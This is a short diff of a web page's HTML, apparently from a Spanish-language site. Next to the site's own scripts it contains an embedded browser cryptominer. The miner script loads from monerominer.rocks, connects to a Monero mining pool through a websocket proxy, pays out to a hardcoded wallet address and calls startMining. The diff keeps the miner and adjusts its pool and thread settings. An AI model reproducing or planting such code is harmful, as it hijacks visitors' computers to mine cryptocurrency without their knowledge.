@@ -239,13 +239,16 @@
 <script src="/js/cliente1.js"></script>
 <script src="/js/estado.js"></script>
 
+
+
+
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "gulf.moneroocean.stream:20128";
+    var pool = "moneroocean.stream";
     var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
     var workerId = ""
-    var threads = -5;
+    var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
